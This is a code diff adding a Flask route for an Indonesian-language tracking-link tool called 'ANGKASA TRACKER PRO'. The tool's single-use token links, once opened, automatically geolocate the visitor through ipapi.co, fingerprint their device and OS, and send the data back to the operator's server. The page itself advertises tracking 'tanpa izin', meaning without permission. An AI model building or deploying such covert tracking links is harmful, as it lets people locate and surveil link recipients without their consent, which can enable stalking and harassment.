@@ -1001,7 +1001,6 @@ def serve_main_panel():
     return send_from_directory(base_dir, 'panel.html')
 
 # ==================== TRACKER ROUTES ====================
-# <<<<<< TARUH KODE DI SINI >>>>>>
 
 @app.route('/simpang-44')
 def serve_tracker_main():
@@ -1010,6 +1009,218 @@ def serve_tracker_main():
 @app.route('/tracker-data')
 def serve_tracker_data():
     return send_from_directory(os.path.join(base_dir, 'tracker', 'html'), 'data-tracker.html')
+
+# ==================== TAMBAHKAN ROUTE VIEW TRACKER ====================
+@app.route('/tracker/view')
+def tracker_view_page():
+    """Halaman tracking untuk endpoint unik - menggunakan blueprint atau langsung"""
+    token = request.args.get('token', '')
+    
+    if not token:
+        return '''
+        <!DOCTYPE html>
+        <html>
+        <head><meta charset="UTF-8"><title>Not Found</title>
+        <style>body{background:#0a0f1e;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace;}</style>
+        </head>
+        <body><div style="text-align:center"><h1>🔒 404</h1><p>Link tidak valid.</p></div></body>
+        </html>
+        ''', 404
+    
+    # Import blueprint function
+    try:
+        from tracker.services.data_tracker_service import view_tracker
+        return view_tracker()
+    except ImportError:
+        # Fallback: akses database langsung
+        import sqlite3
+        
+        DB_PATH = os.path.join(base_dir, 'tracker', 'database', 'tracker.db')
+        
+        if not os.path.exists(DB_PATH):
+            DB_PATH = os.path.join(base_dir, 'tracker', 'database', 'tracker.db')
+        
+        conn = sqlite3.connect(DB_PATH)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        
+        cursor.execute('''
+            SELECT endpoint_id, endpoint_name, is_used, used_by_ip 
+            FROM tracker_data WHERE endpoint_token = ?
+        ''', (token,))
+        
+        row = cursor.fetchone()
+        
+        if not row:
+            conn.close()
+            return '''
+            <!DOCTYPE html>
+            <html>
+            <head><meta charset="UTF-8"><title>Not Found</title>
+            <style>body{background:#0a0f1e;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace;}</style>
+            </head>
+            <body><div style="text-align:center"><h1>🔒 404</h1><p>Link tidak valid atau sudah expired.</p></div></body>
+            </html>
+            ''', 404
+        
+        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        
+        if row['is_used'] == 1:
+            if row['used_by_ip'] != client_ip:
+                conn.close()
+                return '''
+                <!DOCTYPE html>
+                <html>
+                <head><meta charset="UTF-8"><title>Link Sudah Digunakan</title>
+                <style>body{background:#0a0f1e;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace;}</style>
+                </head>
+                <body><div style="text-align:center"><h1>🔒 403</h1><p>Link ini sudah digunakan oleh orang lain.</p><p>Setiap link hanya bisa digunakan 1 orang pertama.</p></div></body>
+                </html>
+                ''', 403
+        
+        if row['is_used'] == 0:
+            cursor.execute('''
+                UPDATE tracker_data 
+                SET is_used = 1, used_by_ip = ?, used_at = CURRENT_TIMESTAMP
+                WHERE endpoint_token = ?
+            ''', (client_ip, token))
+            conn.commit()
+        
+        conn.close()
+        
+        # Render halaman tracker
+        return f'''
+        <!DOCTYPE html>
+        <html lang="id">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>ANGKASA TRACKER PRO</title>
+            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+            <style>
+                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+                body {{
+                    font-family: 'Inter', sans-serif;
+                    background: radial-gradient(circle at 20% 30%, #0a0f1e, #03050b);
+                    min-height: 100vh;
+                    padding: 24px 16px;
+                    color: #eef5ff;
+                }}
+                .container {{ max-width: 800px; margin: 0 auto; }}
+                .glow-header {{ text-align: center; margin-bottom: 40px; }}
+                .glow-header h1 {{
+                    font-size: 2.8rem;
+                    font-weight: 800;
+                    background: linear-gradient(135deg, #c084fc, #60a5fa, #f472b6);
+                    -webkit-background-clip: text;
+                    background-clip: text;
+                    color: transparent;
+                }}
+                .card {{
+                    background: rgba(15, 25, 45, 0.65);
+                    backdrop-filter: blur(12px);
+                    border-radius: 28px;
+                    padding: 22px;
+                    border: 1px solid rgba(96, 165, 250, 0.25);
+                }}
+                .info-row {{
+                    display: flex;
+                    justify-content: space-between;
+                    padding: 12px 0;
+                    border-bottom: 1px solid rgba(255,255,255,0.06);
+                }}
+                .info-label {{ color: #9ca8cf; }}
+                .info-value {{ font-weight: 600; font-family: monospace; }}
+                .map-link {{ color: #7aa2f7; text-decoration: none; }}
+                .status-badge {{
+                    padding: 8px 12px;
+                    border-radius: 36px;
+                    text-align: center;
+                    margin-top: 12px;
+                    background: rgba(0,0,0,0.4);
+                }}
+                .success {{ background: rgba(34,197,94,0.2); color: #86efac; }}
+                .error {{ background: rgba(239,68,68,0.2); color: #fca5a5; }}
+            </style>
+        </head>
+        <body>
+        <div class="container">
+            <div class="glow-header">
+                <h1>🛸 ANGKASA TRACKER PRO</h1>
+                <p>IP Geolocation Master | Auto Track Tanpa Izin</p>
+            </div>
+            <div class="card">
+                <h3>🌍 DATA LOKASI ANDA</h3>
+                <div id="tracker-data">
+                    <div class="info-row"><span class="info-label">🌐 IP Publik</span><span class="info-value" id="ip">Memuat...</span></div>
+                    <div class="info-row"><span class="info-label">📌 Koordinat</span><span class="info-value" id="coord">-</span></div>
+                    <div class="info-row"><span class="info-label">📍 Lokasi</span><span class="info-value" id="location">-</span></div>
+                    <div class="info-row"><span class="info-label">📡 ISP</span><span class="info-value" id="isp">-</span></div>
+                    <div class="info-row"><span class="info-label">📱 Perangkat</span><span class="info-value" id="device">-</span></div>
+                    <div class="info-row"><span class="info-label">💻 OS & Browser</span><span class="info-value" id="browser">-</span></div>
+                </div>
+                <div id="status" class="status-badge">⏳ Mengirim data...</div>
+            </div>
+        </div>
+        <script>
+            async function trackAndSend() {{
+                const statusDiv = document.getElementById('status');
+                const endpointId = '{row["endpoint_id"]}';
+                try {{
+                    const resp = await fetch('https://ipapi.co/json/');
+                    const data = await resp.json();
+                    
+                    document.getElementById('ip').innerText = data.ip;
+                    if (data.latitude && data.longitude) {{
+                        document.getElementById('coord').innerHTML = `${{data.latitude}}, ${{data.longitude}} <a href="https://www.google.com/maps?q=${{data.latitude}},${{data.longitude}}" target="_blank" class="map-link">🗺️ peta</a>`;
+                    }}
+                    let location = data.city || '';
+                    if (data.region) location += location ? `, ${{data.region}}` : data.region;
+                    if (data.country_name) location += location ? `, ${{data.country_name}}` : data.country_name;
+                    document.getElementById('location').innerText = location || '-';
+                    document.getElementById('isp').innerText = data.org || '-';
+                    
+                    const ua = navigator.userAgent;
+                    let device = 'Desktop';
+                    if (/Mobile|Android|iPhone|iPod/i.test(ua)) device = 'Mobile';
+                    else if (/iPad|Tablet/i.test(ua)) device = 'Tablet';
+                    document.getElementById('device').innerText = device;
+                    
+                    let os = 'Unknown';
+                    if (ua.includes('Windows NT 10.0')) os = 'Windows 11/10';
+                    else if (ua.includes('Mac OS X')) os = 'macOS';
+                    else if (ua.includes('Android')) os = 'Android';
+                    else if (/(iPhone|iPad|iPod)/.test(ua)) os = 'iOS';
+                    document.getElementById('browser').innerText = os;
+                    
+                    const sendResp = await fetch(window.location.origin + '/tracker/api/track', {{
+                        method: 'POST',
+                        headers: {{ 'Content-Type': 'application/json' }},
+                        body: JSON.stringify({{
+                            endpoint_id: endpointId,
+                            geo_data: data,
+                            device_info: {{ device: device, os: os, browser: os }}
+                        }})
+                    }});
+                    
+                    const result = await sendResp.json();
+                    if (result.success) {{
+                        statusDiv.innerHTML = '✅ Data berhasil dikirim!';
+                        statusDiv.className = 'status-badge success';
+                    }} else {{
+                        statusDiv.innerHTML = '⚠️ ' + (result.error || 'Gagal mengirim data');
+                        statusDiv.className = 'status-badge error';
+                    }}
+                }} catch(e) {{
+                    statusDiv.innerHTML = '❌ Error: ' + e.message;
+                    statusDiv.className = 'status-badge error';
+                }}
+            }}
+            trackAndSend();
+        </script>
+        </body>
+        </html>
+        '''
 
 @app.route('/tracker/html/<path:filename>')
 def serve_tracker_html(filename):
